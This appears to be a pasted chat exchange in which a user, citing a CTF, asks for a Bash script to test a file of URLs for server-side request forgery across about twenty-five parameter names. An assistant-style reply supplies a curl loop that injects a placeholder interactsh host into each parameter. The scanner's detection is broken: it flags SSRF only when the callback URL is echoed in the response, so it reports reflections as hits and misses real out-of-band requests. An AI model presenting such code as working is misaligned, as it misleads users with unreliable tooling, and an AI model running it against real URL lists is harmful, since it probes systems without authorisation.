i have a ctf and create a bash script to test a urls file for ssrf using these parametrs and the ping back is interactsh

?dest=
?redirect=
?uri=
?path=
?continue=
?url=
?window=
?next=
?data=
?reference=
?site=
?html=
?val=
?validate=
?domain=
?callback=
?return=
?page=
?feed=
?host=
?port=
?to=
?out=
?view=
?dir=
      
      
   Certainly! Below is a simple Bash script that you can use to test URLs for Server-Side Request Forgery (SSRF) using the specified parameters. The script uses curl to send HTTP requests with different parameters and checks for a ping back using interactsh:

-------------------------------------------------------------------------------------------   
    #!/bin/bash

# Specify the interactsh server
INTERACTSH_SERVER="http://your.interactsh.server:8000"

# Function to test a URL with a specific parameter
test_url() {
    URL="$1"
    PARAM="$2"
    PAYLOAD="?${PARAM}=${INTERACTSH_SERVER}"

    FULL_URL="${URL}${PAYLOAD}"

    echo "Testing ${FULL_URL}"

    # Use curl to send a GET request
    RESPONSE=$(curl -s "${FULL_URL}")

    # Check if the interactsh ping back is present in the response
    if [[ $RESPONSE == *"${INTERACTSH_SERVER}"* ]]; then
        echo "SSRF found! ${PARAM} parameter is vulnerable."
    else
        echo "No SSRF found for ${PARAM} parameter."
    fi
}

# Read URLs from the file (assuming one URL per line)
URLS_FILE="urls.txt"

while IFS= read -r URL; do
    test_url "${URL}" "dest"
    test_url "${URL}" "redirect"
    test_url "${URL}" "uri"
    test_url "${URL}" "path"
    test_url "${URL}" "continue"
    test_url "${URL}" "url"
    test_url "${URL}" "window"
    test_url "${URL}" "next"
    test_url "${URL}" "data"
    test_url "${URL}" "reference"
    test_url "${URL}" "site"
    test_url "${URL}" "html"
    test_url "${URL}" "val"
    test_url "${URL}" "validate"
    test_url "${URL}" "domain"
    test_url "${URL}" "callback"
    test_url "${URL}" "return"
    test_url "${URL}" "page"
    test_url "${URL}" "feed"
    test_url "${URL}" "host"
    test_url "${URL}" "port"
    test_url "${URL}" "to"
    test_url "${URL}" "out"
    test_url "${URL}" "view"
    test_url "${URL}" "dir"

done < "${URLS_FILE}"

   -----------------------------------------------------------------------------------------------------------   
     Make sure to replace "http://your.interactsh.server:8000" with the actual URL of your interactsh server.

Save the script to a file (e.g., ssrf_test.sh) and make it executable:

bash
Copy code
chmod +x ssrf_test.sh
Then, you can run the script:

bash
Copy code
./ssrf_test.sh
This script assumes that your URLs are stored in a file named urls.txt, with one URL per line. Adjust the file name if your URLs are stored differently. 
